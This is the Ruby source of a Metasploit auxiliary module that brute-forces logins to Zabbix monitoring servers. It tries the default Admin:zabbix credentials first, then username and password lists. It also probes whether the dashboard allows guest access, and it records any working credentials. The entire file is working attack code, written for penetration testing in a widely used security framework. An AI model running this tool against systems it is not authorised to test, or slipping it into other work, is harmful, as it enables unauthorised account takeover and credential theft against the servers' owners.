##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/login_scanner/zabbix'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'Zabbix Server Brute Force Utility',
      'Description'    => %q{
        This module attempts to login to Zabbix server instance using username and password
        combinations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE options. It
        will also test for the Zabbix default login (Admin:zabbix) and guest access.
      },
      'Author'         =>
        [
          'hdm'
        ],
      'License'        => MSF_LICENSE
    )

    deregister_options('PASSWORD_SPRAY')

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [ true,  'The path to the Zabbix server application', '/zabbix/']),
      ])
  end

  #
  # main
  #
  def run_host(ip)
    init_loginscanner(ip)
    msg = @scanner.check_setup
    if msg
      print_brute :level => :error, :ip => rhost, :msg => msg
      return
    end

    print_brute :level=>:status, :ip=>rhost, :msg=>("Found Zabbix version #{@scanner.version}")

    if is_guest_mode_enabled?
      print_brute :level => :good, :ip => ip, :msg => "Note: This Zabbix instance has Guest mode enabled"
    else
      print_brute :level=>:status, :ip=>rhost, :msg=>("Zabbix has disabled Guest mode")
    end

    bruteforce(ip)
  end

  def bruteforce(ip)
    @scanner.scan! do |result|
      case result.status
        when Metasploit::Model::Login::Status::SUCCESSFUL
          print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
          do_report(ip, rport, result)
          :next_user
        when Metasploit::Model::Login::Status::DENIED_ACCESS
          print_brute :level => :status, :ip => ip, :msg => "Correct credentials, but unable to login: '#{result.credential}'"
          do_report(ip, rport, result)
          :next_user
        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
          if datastore['VERBOSE']
            print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
          end
          invalidate_login(
            address: ip,
            port: rport,
            protocol: 'tcp',
            public: result.credential.public,
            private: result.credential.private,
            realm_key: result.credential.realm_key,
            realm_value: result.credential.realm,
            status: result.status
          )
          :abort
        when Metasploit::Model::Login::Status::INCORRECT
          if datastore['VERBOSE']
            print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
          end
          invalidate_login(
            address: ip,
            port: rport,
            protocol: 'tcp',
            public: result.credential.public,
            private: result.credential.private,
            realm_key: result.credential.realm_key,
            realm_value: result.credential.realm,
            status: result.status
          )
      end
    end
  end

  def do_report(ip, port, result)
    service_data = {
      address: ip,
      port: port,
      service_name: 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: self.fullname,
      origin_type: :service,
      private_data: result.credential.private,
      private_type: :password,
      username: result.credential.public,
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      last_attempted_at: DateTime.now,
      status: result.status
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def init_loginscanner(ip)
    @cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file:       datastore['PASS_FILE'],
      password:        datastore['PASSWORD'],
      user_file:       datastore['USER_FILE'],
      userpass_file:   datastore['USERPASS_FILE'],
      username:        datastore['USERNAME'],
      user_as_pass:    datastore['USER_AS_PASS']
    )

    # Always try the default first
    @cred_collection.prepend_cred(
      Metasploit::Framework::Credential.new(public: 'Admin', private: 'zabbix')
    )

    @scanner = Metasploit::Framework::LoginScanner::Zabbix.new(
      configure_http_login_scanner(
        uri:                datastore['TARGETURI'],
        cred_details:       @cred_collection,
        stop_on_success:    datastore['STOP_ON_SUCCESS'],
        bruteforce_speed:   datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 5,
        http_username:      datastore['HttpUsername'],
        http_password:      datastore['HttpPassword']
      )
    )
  end

  #
  # From the documentation:
  #
  # "In case of five consecutive failed login attempts, Zabbix interface will pause for 30
  # seconds in order to prevent brute force and dictionary attacks."
  #

  # Zabbix enables a Guest mode by default that allows access to the dashboard without auth
  def is_guest_mode_enabled?
    dashboard_uri = normalize_uri(datastore['TARGETURI'] + '/' + 'dashboard.php')
    res = send_request_cgi({'uri'=>dashboard_uri})
    !! (res && res.code == 200 && res.body.to_s =~ /<title>Zabbix .*: Dashboard<\/title>/)
  end
end
